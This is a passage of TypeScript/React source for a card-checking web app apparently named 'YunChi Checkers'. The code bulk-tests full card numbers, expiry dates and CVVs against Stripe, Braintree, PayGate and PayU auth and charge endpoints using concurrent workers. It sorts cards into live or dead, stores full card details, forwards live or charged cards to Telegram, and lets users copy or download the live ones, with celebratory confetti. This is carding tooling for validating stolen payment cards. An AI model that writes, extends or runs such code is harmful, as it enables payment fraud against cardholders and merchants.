        if (selectedGateway.id === "stripe_auth") {
          gatewayResponse = await checkCardViaApi(cardData.card, cardData.month, cardData.year, cardData.cvv);
        } else if (selectedGateway.id === "combined_auth") {
          // Parallel distributed processing: alternate cards between Stripe (even) and B3 (odd)
          const targetApi: 'stripe' | 'b3' = cardIndex % 2 === 0 ? 'stripe' : 'b3';
          gatewayResponse = await checkCardViaDistributed(cardData.card, cardData.month, cardData.year, cardData.cvv, targetApi);
        } else if (selectedGateway.id === "braintree_auth") {
          gatewayResponse = await checkCardViaB3(cardData.card, cardData.month, cardData.year, cardData.cvv);
        } else if (selectedGateway.id === "paygate_charge") {
          gatewayResponse = await checkCardViaPaygate(cardData.card, cardData.month, cardData.year, cardData.cvv);
        } else if (selectedGateway.id === "stripe_charge") {
          gatewayResponse = await checkCardViaStripeCharge(cardData.card, cardData.month, cardData.year, cardData.cvv);
        } else if (selectedGateway.id === "payu_charge") {
          gatewayResponse = await checkCardViaPayU(cardData.card, cardData.month, cardData.year, cardData.cvv, payuAmount);
        }
        
        const checkStatus = gatewayResponse ? gatewayResponse.status : await simulateCheck();

        const fullCardStr = `${cardData.card}|${cardData.month}|${cardData.year}|${cardData.cvv}`;
        const displayCardStr = cardData.originalCvv 
          ? `${cardData.card}|${cardData.month}|${cardData.year}|${cardData.originalCvv}`
          : `${cardData.card}|${cardData.month}|${cardData.year}`;
        
        // Determine credit cost based on result: LIVE = 2, DEAD = 1, ERROR = 0
        const creditCost = checkStatus === "live" 
          ? CREDIT_COST_LIVE 
          : checkStatus === "dead" 
            ? CREDIT_COST_DEAD 
            : CREDIT_COST_ERROR;

        // Deduct credits if not an error - use edge function to bypass RLS
        if (creditCost > 0) {
          const { data: deductResult, error: deductError } = await supabase.functions.invoke('deduct-credits', {
            body: { amount: creditCost }
          });
          
          if (!deductError && deductResult?.success) {
            totalCreditsDeducted += creditCost;
            setUserCredits(deductResult.newCredits);
          }
        }

        // Log check with result and card details
        await supabase
          .from('card_checks')
          .insert({
            user_id: userId,
            gateway: selectedGateway.id,
            status: 'completed',
            result: checkStatus,
            card_details: fullCardStr
          });

        const { brand, brandColor } = detectCardBrandLocal(cardData.card);
        
        // Build API response string for display
        const apiResponseDisplay = gatewayResponse 
          ? `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`
          : undefined;
        
        const bulkResult: BulkResult = {
          status: checkStatus,
          message: checkStatus === "live" 
            ? "Valid" 
            : checkStatus === "dead" 
              ? "Declined"
              : "Unknown",
          gateway: selectedGateway.name,
          cardMasked: maskCard(cardData.card),
          fullCard: fullCardStr,
          displayCard: displayCardStr,
          brand,
          brandColor,
          apiResponse: apiResponseDisplay,
          usedApi: gatewayResponse?.usedGateway,
          rawResponse: gatewayResponse?.rawResponse
        };

        // Send Telegram notification for PAYGATE checks (CHARGED/DECLINED only, skip UNKNOWN)
        if (selectedGateway.id === "paygate_charge" && gatewayResponse && checkStatus !== "unknown") {
          try {
            // Build real response message from API
            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`;
            
            await supabase.functions.invoke('notify-charged-card', {
              body: {
                user_id: userId,
                card_details: fullCardStr,
                status: checkStatus === "live" ? "CHARGED" : "DECLINED",
                response_message: realResponseMessage,
                amount: gatewayResponse.apiTotal || "$14.00",
                gateway: "PAYGATE",
                api_response: gatewayResponse.rawResponse
              }
            });
          } catch (notifyError) {
            console.log("Failed to send Telegram notification:", notifyError);
          }
        }

        // Send Telegram notification for B3 checks (LIVE ONLY - user requested no declined cards)
        if (selectedGateway.id === "braintree_auth" && gatewayResponse && checkStatus === "live") {
          try {
            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
            
            await supabase.functions.invoke('notify-charged-card', {
              body: {
                user_id: userId,
                card_details: fullCardStr,
                status: "CHARGED",
                response_message: realResponseMessage,
                amount: "$0 Auth",
                gateway: "YUNCHI AUTH 3",
                api_response: gatewayResponse.rawResponse
              }
            });
          } catch (notifyError) {
            console.log("Failed to send Telegram notification:", notifyError);
          }
        }

        // Send Telegram notification for STRIPE AUTH checks (LIVE ONLY) in bulk
        if (selectedGateway.id === "stripe_auth" && gatewayResponse && checkStatus === "live") {
          try {
            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
            
            await supabase.functions.invoke('notify-charged-card', {
              body: {
                user_id: userId,
                card_details: fullCardStr,
                status: "CHARGED",
                response_message: realResponseMessage,
                amount: "$0 Auth",
                gateway: "YUNCHI AUTH 1",
                api_response: gatewayResponse.rawResponse
              }
            });
          } catch (notifyError) {
            console.log("Failed to send Telegram notification:", notifyError);
          }
        }

        // Send Telegram notification for COMBINED AUTH checks (LIVE ONLY) in bulk
        if (selectedGateway.id === "combined_auth" && gatewayResponse && checkStatus === "live") {
          try {
            const usedApiLabel = gatewayResponse.usedGateway === 'stripe' ? 'STRIPE' : gatewayResponse.usedGateway === 'b3' ? 'B3' : 'COMBINED';
            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
            
            await supabase.functions.invoke('notify-charged-card', {
              body: {
                user_id: userId,
                card_details: fullCardStr,
                status: "CHARGED",
                response_message: realResponseMessage,
                amount: "$0 Auth",
                gateway: `YUNCHI AUTH 2 (${usedApiLabel})`,
                api_response: gatewayResponse.rawResponse
              }
            });
          } catch (notifyError) {
            console.log("Failed to send Telegram notification:", notifyError);
          }
        }

        // Send Telegram notification for PayU checks (LIVE ONLY) in bulk
        if (selectedGateway.id === "payu_charge" && gatewayResponse && checkStatus === "live") {
          try {
            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
            
            await supabase.functions.invoke('notify-charged-card', {
              body: {
                user_id: userId,
                card_details: fullCardStr,
                status: "CHARGED",
                response_message: realResponseMessage,
                amount: `₹${payuAmount}`,
                gateway: "YUNCHI PayU",
                api_response: gatewayResponse.rawResponse
              }
            });
          } catch (notifyError) {
            console.log("Failed to send Telegram notification:", notifyError);
          }
        }

        // Send Telegram notification for STRIPE CHARGE checks (CHARGED/DECLINED only, skip UNKNOWN) in bulk
        if (selectedGateway.id === "stripe_charge" && gatewayResponse && checkStatus !== "unknown") {
          try {
            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`;
            
            await supabase.functions.invoke('notify-charged-card', {
              body: {
                user_id: userId,
                card_details: fullCardStr,
                status: checkStatus === "live" ? "CHARGED" : "DECLINED",
                response_message: realResponseMessage,
                amount: gatewayResponse.apiTotal || "$8.00",
                gateway: "Yunchi Stripe Charge",
                api_response: gatewayResponse.rawResponse
              }
            });
          } catch (notifyError) {
            console.log("Failed to send Telegram notification:", notifyError);
          }
        }

        // Play sound and celebrate for each live card in bulk check
        if (checkStatus === "live") {
          playLiveSoundIfEnabled();
          
          const bloodRedColors = ['#dc2626', '#ef4444', '#b91c1c', '#991b1b', '#7f1d1d', '#fca5a5'];
          
          const xPos = 0.3 + Math.random() * 0.4;
          confetti({
            particleCount: 60,
            spread: 70,
            origin: { x: xPos, y: 0.6 },
            colors: bloodRedColors,
            gravity: 1,
            scalar: 1.1
          });
          
          confetti({
            particleCount: 25,
            angle: 60,
            spread: 40,
            origin: { x: 0, y: 0.7 },
            colors: bloodRedColors,
            gravity: 1.2
          });
          confetti({
            particleCount: 25,
            angle: 120,
            spread: 40,
            origin: { x: 1, y: 0.7 },
            colors: bloodRedColors,
            gravity: 1.2
          });
        }

        // Add to local history with full card info
        const newCheck: GatewayCheck = {
          id: crypto.randomUUID(),
          created_at: new Date().toISOString(),
          gateway: selectedGateway.id,
          status: 'completed',
          result: checkStatus,
          fullCard: bulkResult.fullCard,
          displayCard: bulkResult.displayCard
        };
        setGatewayHistory(prev => [newCheck, ...prev].slice(0, 50));

        return bulkResult;

      } catch (error) {
        console.error('Bulk check error:', error);
        const displayCardStr = cardData.originalCvv 
          ? `${cardData.card}|${cardData.month}|${cardData.year}|${cardData.originalCvv}`
          : `${cardData.card}|${cardData.month}|${cardData.year}`;
        const { brand: errorBrand, brandColor: errorBrandColor } = detectCardBrandLocal(cardData.card);
        return {
          status: "unknown" as const,
          message: "Error",
          gateway: selectedGateway.name,
          cardMasked: maskCard(cardData.card),
          fullCard: `${cardData.card}|${cardData.month}|${cardData.year}|${cardData.cvv}`,
          displayCard: displayCardStr,
          brand: errorBrand,
          brandColor: errorBrandColor
        };
      }
    };

    // Process cards with user-selected worker count
    const CONCURRENT_WORKERS = workerCount; // Use user-selected worker count (1-10)
    let currentIndex = 0;
    let completedCount = 0;

    const processNextCard = async (): Promise<void> => {
      while (currentIndex < validCards.length && !bulkAbortRef.current) {
        const myIndex = currentIndex++;
        
        // Wait if paused
        while (bulkPauseRef.current && !bulkAbortRef.current) {
          await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        if (bulkAbortRef.current) return;
        
        const result = await processCard(myIndex);
        
        if (result) {
          // IMMEDIATELY show result as it completes (no ordering delay)
          allResults.push(result);
          completedCount++;
          processedCount++;
          
          // Update UI immediately with this result
          setBulkResults(prev => [...prev, result]);
          setBulkCurrentIndex(completedCount);
          setBulkProgress((completedCount / validCards.length) * 100);
          
          // Calculate estimated time remaining
          const elapsed = Date.now() - startTime;
          const avgTimePerCard = elapsed / completedCount;
          const remainingCards = validCards.length - completedCount;
          const remainingMs = avgTimePerCard * remainingCards;
          
          if (remainingCards > 0) {
            const remainingSecs = Math.ceil(remainingMs / 1000);
            if (remainingSecs >= 60) {
              const mins = Math.floor(remainingSecs / 60);
              const secs = remainingSecs % 60;
              setBulkEstimatedTime(`~${mins}m ${secs}s remaining`);
            } else {
              setBulkEstimatedTime(`~${remainingSecs}s remaining`);
            }
          } else {
            setBulkEstimatedTime("Finishing...");
          }
          
          // Update remaining lines in textarea (based on completed count)
          const remainingLinesNow = originalLines.slice(completedCount);
          setBulkInput(remainingLinesNow.join('\n'));
        }
      }
    };

    // Start concurrent workers
    const workers = Array(Math.min(CONCURRENT_WORKERS, validCards.length))
      .fill(null)
      .map(() => processNextCard());
    
    await Promise.all(workers);

    if (bulkAbortRef.current) {
      toast.info("Bulk check stopped");
      // No refund needed since we charge per result
    }

    // Disable background mode when bulk check completes
    stopBackgroundMode();
    
    setBulkChecking(false);
    setBulkPaused(false);
    
    // Trigger final celebration after a short delay to ensure all results are counted
    setTimeout(() => {
      setBulkResults(prev => {
        const finalLiveCount = prev.filter(r => r.status === 'live').length;
        const bloodRedColors = ['#dc2626', '#ef4444', '#b91c1c', '#991b1b', '#7f1d1d', '#fca5a5'];
        
        if (finalLiveCount >= 5) {
          // MEGA celebration for 5+ live cards - Epic blood rain
          playVictorySoundIfEnabled("epic");
          
          const duration = 4000;
          const end = Date.now() + duration;
          
          // Initial massive explosion
          confetti({
            particleCount: 200,
            spread: 180,
            origin: { y: 0.5 },
            colors: bloodRedColors,
            gravity: 0.5,
            scalar: 1.5
          });
          
          // Delayed center burst
          setTimeout(() => {
            confetti({
              particleCount: 150,
              spread: 120,
              origin: { y: 0.6, x: 0.5 },
              colors: bloodRedColors,
              gravity: 0.7
            });
          }, 200);
          
          const frame = () => {
            // Side cannons with varying intensity
            confetti({
              particleCount: 8,
              angle: 60,
              spread: 55,
              origin: { x: 0, y: Math.random() * 0.4 + 0.3 },
              colors: bloodRedColors,
              gravity: 1.2,
              scalar: 1.2
            });
            confetti({
              particleCount: 8,
              angle: 120,
              spread: 55,
              origin: { x: 1, y: Math.random() * 0.4 + 0.3 },
              colors: bloodRedColors,
              gravity: 1.2,
              scalar: 1.2
            });
            
            // Blood rain from top
            confetti({
              particleCount: 4,
              spread: 40,
              origin: { x: Math.random(), y: 0 },
              colors: bloodRedColors,
              gravity: 2.5,
              startVelocity: 20,
              ticks: 80
            });
            
            if (Date.now() < end) {
              requestAnimationFrame(frame);
            }
          };
          frame();
          
          toast.success(`🔥 EPIC! ${finalLiveCount} LIVE CARDS FOUND! 🔥`, {
            description: "Bulk check completed successfully!"
          });
          
        } else if (finalLiveCount >= 3) {
          // Epic blood rain celebration for 3-4 live cards
          playVictorySoundIfEnabled("medium");
          
          const duration = 3000;
          const end = Date.now() + duration;
          
          // Initial explosion
          confetti({
            particleCount: 150,
            spread: 180,
            origin: { y: 0.5 },
            colors: bloodRedColors,
            gravity: 0.6,
            scalar: 1.3
          });
          
          const frame = () => {
            confetti({
              particleCount: 5,
              angle: 60,
              spread: 45,
              origin: { x: 0, y: Math.random() * 0.4 + 0.3 },
              colors: bloodRedColors,
              gravity: 1.2,
              scalar: 1.1
            });
            confetti({
              particleCount: 5,
              angle: 120,
              spread: 45,
              origin: { x: 1, y: Math.random() * 0.4 + 0.3 },
              colors: bloodRedColors,
              gravity: 1.2,
              scalar: 1.1
            });
            
            if (Math.random() > 0.5) {
              confetti({
                particleCount: 3,
                spread: 30,
                origin: { x: Math.random(), y: 0 },
                colors: bloodRedColors,
                gravity: 2,
                startVelocity: 15,
                ticks: 60
              });
            }
            
            if (Date.now() < end) {
              requestAnimationFrame(frame);
            }
          };
          frame();
          
          toast.success(`🎉 ${finalLiveCount} LIVE CARDS FOUND!`, {
            description: "Bulk check completed!"
          });
          
        } else if (finalLiveCount >= 1) {
          // Dramatic burst for 1-2 live cards
          playVictorySoundIfEnabled("small");
          
          confetti({
            particleCount: 120,
            spread: 100,
            origin: { y: 0.6 },
            colors: bloodRedColors,
            gravity: 0.8,
            scalar: 1.2
          });
          
          // Side accents
          setTimeout(() => {
            confetti({
              particleCount: 50,
              angle: 60,
              spread: 50,
              origin: { x: 0, y: 0.6 },
              colors: bloodRedColors
            });
            confetti({
              particleCount: 50,
              angle: 120,
              spread: 50,
              origin: { x: 1, y: 0.6 },
              colors: bloodRedColors
            });
          }, 100);
          
          toast.success(`✅ ${finalLiveCount} LIVE CARD${finalLiveCount > 1 ? 'S' : ''} FOUND!`, {
            description: "Bulk check completed!"
          });
        } else {
          toast.info(`Bulk check completed. No live cards found.`);
        }
        
        return prev;
      });
    }, 200);
    
    // Refresh history after bulk check
    fetchGatewayHistory(selectedGateway.id);
  };

  const pauseBulkCheck = () => {
    bulkPauseRef.current = true;
    setBulkPaused(true);
  };

  const resumeBulkCheck = () => {
    bulkPauseRef.current = false;
    setBulkPaused(false);
  };

  const stopBulkCheck = () => {
    bulkAbortRef.current = true;
    bulkPauseRef.current = false;
    setBulkPaused(false);
    // Disable background mode when user stops the check
    stopBackgroundMode();
  };

  const copyResults = (type: "live" | "dead" | "all") => {
    let cards: string[];
    if (type === "all") {
      cards = bulkResults.map(r => r.fullCard);
    } else {
      cards = bulkResults.filter(r => r.status === type).map(r => r.fullCard);
    }
    
    if (cards.length === 0) {
      toast.error("No cards to copy");
      return;
    }

    navigator.clipboard.writeText(cards.join('\n'));
    toast.success(`Copied ${cards.length} ${type} cards`);
  };

  const downloadResults = (type: "live" | "dead" | "all") => {
    let cards: string[];
    if (type === "all") {
      cards = bulkResults.map(r => `${r.fullCard} | ${r.status.toUpperCase()}`);
    } else {
      cards = bulkResults.filter(r => r.status === type).map(r => r.fullCard);
    }
    
    if (cards.length === 0) {
      toast.error("No cards to download");
      return;
    }

    const blob = new Blob([cards.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cards_${type}_${new Date().toISOString().slice(0, 10)}.txt`;
    a.click();
    URL.revokeObjectURL(url);
    toast.success(`Downloaded ${cards.length} ${type} cards`);
  };

  const clearBulk = () => {
    setBulkInput("");
    setBulkResults([]);
    setBulkProgress(0);
    setBulkTotal(0);
    setBulkCurrentIndex(0);
  };

  const getTypeLabel = (type: Gateway["type"]) => {
    switch (type) {
      case "auth": return "Auth";
      case "preauth": return "Pre-Auth";
      case "charge": return "Charge";
    }
  };

  const getTypeBadgeClass = (type: Gateway["type"]) => {
    switch (type) {
      case "auth": return "bg-blue-500/20 text-blue-400 border-blue-500/30";
      case "preauth": return "bg-purple-500/20 text-purple-400 border-purple-500/30";
      case "charge": return "bg-orange-500/20 text-orange-400 border-orange-500/30";
    }
  };

  const liveCount = bulkResults.filter(r => r.status === "live").length;
  const deadCount = bulkResults.filter(r => r.status === "dead").length;
  const unknownCount = bulkResults.filter(r => r.status === "unknown").length;

  // If no gateway selected, show gateway list
  if (!selectedGateway) {
    return (
      <div className="space-y-6">
        {/* YunChi Checkers Logo Header */}
        <div className="flex items-center justify-center py-4">
          <div className="flex items-center gap-3">
            <div className="relative">
              <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary to-primary/60 flex items-center justify-center shadow-lg shadow-primary/25">
                <CreditCard className="h-6 w-6 text-primary-foreground" />
              </div>
              <div className="absolute -bottom-1 -right-1 w-4 h-4 rounded-full bg-green-500 border-2 border-background flex items-center justify-center">
                <CheckCircle className="h-2.5 w-2.5 text-white" />
              </div>
            </div>
            <div className="text-center sm:text-left">
              <h1 className="text-2xl sm:text-3xl font-display font-bold tracking-tight">
                <span className="text-foreground">YunChi</span>
                <span className="text-primary"> Checkers</span>
              </h1>
              <p className="text-xs text-muted-foreground">Premium Card Verification</p>
            </div>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <h2 className="text-xl sm:text-2xl font-display font-bold text-foreground">GATEWAYS</h2>
            <p className="text-muted-foreground mt-1 text-sm sm:text-base">Select a gateway to start checking cards</p>
          </div>
          <div className="flex items-center gap-3">
            <Badge variant="outline" className="border-primary/50 text-primary py-1 px-3">
              <Coins className="h-3 w-3 mr-1" />
              {userCredits} Credits
            </Badge>
            <Badge variant="outline" className="border-green-500/50 text-green-500 py-1 px-3">
              <Activity className="h-3 w-3 mr-1" />
              {onlineCount}/{gateways.length} Online
            </Badge>
          </div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
          {gateways.map((gateway) => (
            <Card 
              key={gateway.id} 
              onClick={() => gateway.status === "online" && setSelectedGateway(gateway)}
              className={`bg-card border-border transition-all cursor-pointer ${
                gateway.status !== "online" ? "opacity-50 cursor-not-allowed" : "hover:border-primary/50 hover:shadow-lg hover:shadow-primary/5"
              }`}
            >
              <CardHeader className="pb-2 p-4">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-base font-bold flex items-center gap-2">
                    <div className={`p-1.5 rounded-md bg-background/50 ${gateway.iconColor}`}>
                      <gateway.icon className="h-4 w-4" />
                    </div>
                    {gateway.name}
                  </CardTitle>
                  <div className="flex items-center gap-2">
                    {gateway.status === "online" ? (
                      <Badge className="bg-green-500/20 text-green-500 border-green-500/30 text-[10px]">
                        ONLINE
                      </Badge>
                    ) : gateway.status === "maintenance" ? (
                      <Badge className="bg-yellow-500/20 text-yellow-500 border-yellow-500/30 text-[10px]">
                        MAINTENANCE
                      </Badge>
                    ) : (
                      <Badge className="bg-red-500/20 text-red-500 border-red-500/30 text-[10px]">
                        OFFLINE
                      </Badge>
                    )}
                  </div>
                </div>
              </CardHeader>
              <CardContent className="p-4 pt-0 space-y-3">
                <div className="flex flex-wrap gap-1.5">
                  {gateway.code && (
                    <Badge className="bg-primary/20 text-primary border-primary/30 text-[10px] font-mono font-bold">
                      {gateway.code}
                    </Badge>
                  )}
                  <Badge className={`text-[10px] ${getTypeBadgeClass(gateway.type)}`}>
                    {getTypeLabel(gateway.type)}
                  </Badge>
                  <Badge variant="outline" className="text-[10px]">
                    {gateway.cardTypes}
                  </Badge>
                </div>
                
                <p className="text-xs text-muted-foreground">{gateway.description}</p>

                <div className="flex items-center justify-between text-xs pt-2 border-t border-border/50">
                  <div className="flex items-center gap-1">
                    <Zap className="h-3 w-3 text-primary" />
                    <span>{gateway.speed}</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <CheckCircle className="h-3 w-3 text-green-500" />
                    <span className="text-green-500">{gateway.successRate}</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <Coins className="h-3 w-3 text-primary" />
                    <span>1-2 Credits</span>
                  </div>
                </div>

                {gateway.status === "online" && (
                  <Button className="w-full mt-2" size="sm">
                    <span>Open Gateway</span>
                    <ChevronRight className="h-4 w-4 ml-1" />
                  </Button>
                )}
              </CardContent>
            </Card>
          ))}
        </div>
      </div>
    );
  }

  // Gateway selected - show card checking interface
  return (
    <div className="space-y-6">
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <Button 
            variant="ghost" 
            size="icon"
            onClick={() => {
              setSelectedGateway(null);
              clearForm();
              clearBulk();
            }}
            className="shrink-0"
          >
            <ArrowLeft className="h-5 w-5" />
          </Button>
          <div className="flex items-center gap-3">
            <div className={`p-2 rounded-lg bg-card border border-border ${selectedGateway.iconColor}`}>
              <selectedGateway.icon className="h-5 w-5" />
            </div>
            <div>
              <h1 className="text-2xl sm:text-3xl font-display font-bold text-foreground">{selectedGateway.name}</h1>
              <p className="text-muted-foreground mt-1 text-sm sm:text-base">{selectedGateway.description}</p>
            </div>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <Badge variant="outline" className="border-primary/50 text-primary py-1 px-3">
            <Coins className="h-3 w-3 mr-1" />
            {userCredits} Credits
          </Badge>
          <Badge className={`${getTypeBadgeClass(selectedGateway.type)} py-1 px-3`}>
            {getTypeLabel(selectedGateway.type)}
          </Badge>
        </div>
      </div>

      {/* Gateway Info Card */}
      <Card className="bg-card border-border">
        <CardContent className="p-4">
          <div className="flex flex-wrap items-center gap-4 text-sm">
            <div className="flex items-center gap-2">
              <CreditCard className="h-4 w-4 text-primary" />
              <span className="text-muted-foreground">Supported:</span>
              <span className="font-medium">{selectedGateway.cardTypes}</span>
            </div>
            <div className="flex items-center gap-2">
              <Zap className="h-4 w-4 text-primary" />
              <span className="text-muted-foreground">Speed:</span>
              <span className="font-medium">{selectedGateway.speed}</span>
            </div>
            <div className="flex items-center gap-2">
              <CheckCircle className="h-4 w-4 text-green-500" />
              <span className="text-muted-foreground">Success Rate:</span>
              <span className="font-medium text-green-500">{selectedGateway.successRate}</span>
            </div>
            <div className="flex items-center gap-2">
              <Coins className="h-4 w-4 text-primary" />
              <span className="text-muted-foreground">Cost:</span>
              <span className="font-medium">Dead: {CREDIT_COST_DEAD}, Live: {CREDIT_COST_LIVE}, Error: Free</span>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Recent Check History */}
      <Card className="bg-card border-border">
        <CardHeader className="p-2 pb-1">
          <div className="flex items-center justify-between gap-1">
            <CardTitle className="text-[10px] font-semibold flex items-center gap-1">
              <History className="h-3 w-3 text-primary" />
              <span>Checks</span>
              <div className="relative flex items-center">
                <div className={`h-1.5 w-1.5 rounded-full bg-red-500 ${liveIndicator ? 'animate-ping' : ''}`} />
                <div className="absolute h-1.5 w-1.5 rounded-full bg-red-500" />
              </div>
            </CardTitle>
            <div className="flex items-center gap-1">
              {gatewayHistory.length > 0 && (() => {
                const liveCards = gatewayHistory.filter(c => c.result === 'live' && c.fullCard);
                const liveCount = liveCards.length;
                const deadCount = gatewayHistory.filter(c => c.result === 'dead').length;
                const totalValidChecks = liveCount + deadCount;
                const successRate = totalValidChecks > 0 ? Math.round((liveCount / totalValidChecks) * 100) : 0;
                
                const copyAllLiveCards = () => {
                  const liveCardStrings = liveCards.map(c => c.fullCard).join('\n');
                  navigator.clipboard.writeText(liveCardStrings);
                  toast.success(`Copied ${liveCount} live card${liveCount !== 1 ? 's' : ''}`);
                };
                
                return (
                  <>
                    <span className="text-[8px] text-green-500 font-medium">{liveCount}L</span>
                    <span className="text-[8px] text-red-500 font-medium">{deadCount}D</span>
                    {totalValidChecks > 0 && (
                      <span className={`text-[8px] font-medium ${successRate >= 50 ? 'text-green-500' : 'text-red-500'}`}>
                        {successRate}%
                      </span>
                    )}
                    {liveCount > 0 && (
                      <button
                        className="p-0.5 hover:bg-green-500/20 rounded"
                        onClick={copyAllLiveCards}
                      >
                        <Copy className="h-2.5 w-2.5 text-green-500" />
                      </button>
                    )}
                  </>
                );
              })()}
            </div>
          </div>
        </CardHeader>
        <CardContent className="p-2 pt-1">
          {loadingHistory ? (
            <div className="flex items-center justify-center py-2">
              <Loader2 className="h-3 w-3 animate-spin text-muted-foreground" />
            </div>
          ) : gatewayHistory.length === 0 ? (
            <p className="text-[9px] text-muted-foreground text-center py-2">No checks yet</p>
          ) : (
            <ScrollArea className="h-[120px] sm:h-[150px]">
              <div className="space-y-px">
                {gatewayHistory
                  .filter((check) => check.result === 'live' || check.result === 'dead')
                  .map((check) => (
                  <div 
                    key={check.id}
                    className="flex items-center justify-between px-1 py-px rounded bg-secondary/20"
                  >
                    <div className="flex items-center gap-1 flex-1 min-w-0">
                      <span className={`text-[7px] font-bold ${
                        check.result === 'live' ? 'text-green-500' : check.result === 'dead' ? 'text-red-500' : 'text-yellow-500'
                      }`}>
                        {check.result === 'live' ? 'L' : check.result === 'dead' ? 'D' : '?'}
                      </span>
                      {/* Card Brand Logo */}
                      {check.fullCard && (() => {
                        const cardNum = check.fullCard.split('|')[0] || '';
                        const { brand } = detectCardBrandLocal(cardNum);
                        return <CardBrandLogo brand={brand} size="xs" />;
                      })()}
                      <span className="text-[8px] font-mono text-muted-foreground truncate">
                        {check.fullCard || '••••'}
                      </span>
                    </div>
                    <div className="flex items-center gap-0.5 shrink-0">
                      <span className="text-[7px] text-muted-foreground/60 hidden sm:inline">
                        {format(new Date(check.created_at), 'HH:mm')}
                      </span>
                      {check.fullCard && (
                        <button
                          className="p-px hover:bg-primary/20 rounded"
                          onClick={() => {
                            navigator.clipboard.writeText(check.fullCard!);
                            toast.success("Copied");
                          }}
                        >
                          <Copy className="h-2 w-2 text-muted-foreground" />
                        </button>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </ScrollArea>
          )}
        </CardContent>
      </Card>

      {/* Card Check Tabs */}
      <Tabs defaultValue="single" className="w-full">
        <TabsList className="w-full grid grid-cols-2 max-w-md">
          <TabsTrigger value="single" className="text-xs sm:text-sm">
            <CreditCard className="h-3 w-3 mr-1" />
            Single Check
          </TabsTrigger>
          <TabsTrigger value="bulk" className="text-xs sm:text-sm">
            <Layers className="h-3 w-3 mr-1" />
            Bulk Check
          </TabsTrigger>
        </TabsList>

        {/* Single Card Check */}
        <TabsContent value="single" className="mt-4">
          <Card className="bg-card border-border max-w-2xl">
            <CardContent className="p-4 sm:p-6 space-y-4">
              <div className="space-y-3">
                <div>
                  <Label htmlFor="cardNumber" className="text-xs">Card Number</Label>
                  <Input
                    id="cardNumber"
                    placeholder="4242 4242 4242 4242"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    className="mt-1 font-mono"
                    disabled={checking}
                  />
                </div>

                {/* BIN Info Display */}
                {cardNumber.replace(/\s/g, '').length >= 6 && (
                  <div className="p-3 rounded-lg bg-secondary/50 border border-border space-y-2">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className={`w-8 h-5 rounded ${binInfo.brandColor} flex items-center justify-center`}>
                          <span className="text-white text-[8px] font-bold">{binInfo.brand.slice(0, 4).toUpperCase()}</span>
                        </div>
                        <div>
                          <p className="text-sm font-semibold flex items-center gap-1.5">
                            {binInfo.brand}
                            {binInfo.isLoading && <Loader2 className="h-3 w-3 animate-spin text-muted-foreground" />}
                          </p>
                          <p className="text-[10px] text-muted-foreground">{binInfo.type} • {binInfo.level}</p>
                        </div>
                      </div>
                      <div className="flex flex-col items-end gap-0.5">
                        <Badge variant="outline" className="text-[10px]">
                          BIN: {cardNumber.replace(/\s/g, '').slice(0, 6)}
                        </Badge>
                        {binInfo.isRealData && (
                          <span className="text-[9px] text-green-500 flex items-center gap-0.5">
                            <CheckCircle className="h-2.5 w-2.5" />
                            Verified
                          </span>
                        )}
                      </div>
                    </div>
                    
                    <div className="grid grid-cols-2 gap-2 pt-1 border-t border-border/50">
                      <div className="flex items-center gap-1.5">
                        <Building2 className="h-3 w-3 text-muted-foreground" />
                        <span className="text-[10px] text-muted-foreground truncate" title={binInfo.bank}>
                          {binInfo.isLoading ? "Loading..." : binInfo.bank}
                        </span>
                      </div>
                      <div className="flex items-center gap-1.5">
                        <Globe className="h-3 w-3 text-muted-foreground" />
                        <span className="text-[10px] text-muted-foreground">
                          {binInfo.isLoading ? "Loading..." : `${binInfo.country} (${binInfo.countryCode})`}
                        </span>
                      </div>
                    </div>
                  </div>
                )}

                <div className="grid grid-cols-3 gap-2">
                  <div>
                    <Label htmlFor="expMonth" className="text-xs">Month</Label>
                    <Input
                      id="expMonth"
                      placeholder="MM"
                      value={expMonth}
                      onChange={(e) => setExpMonth(e.target.value.replace(/\D/g, '').slice(0, 2))}
                      className="mt-1 font-mono"
                      disabled={checking}
                    />
                  </div>
                  <div>
                    <Label htmlFor="expYear" className="text-xs">Year</Label>
                    <Input
                      id="expYear"
                      placeholder="YY"
                      value={expYear}
                      onChange={(e) => setExpYear(e.target.value.replace(/\D/g, '').slice(0, 2))}
                      className="mt-1 font-mono"
                      disabled={checking}
                    />
                  </div>
                  <div>
                    <Label htmlFor="cvv" className="text-xs">CVV</Label>
                    <Input
                      id="cvv"
                      placeholder="123"
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                      className="mt-1 font-mono"
                      type="password"
                      disabled={checking}
                    />
                  </div>
                </div>

                {/* PayU Custom Amount Input */}
                {selectedGateway?.id === "payu_charge" && (
                  <div className="p-3 rounded-lg bg-orange-500/10 border border-orange-500/30 space-y-2">
                    <div className="flex items-center gap-2">
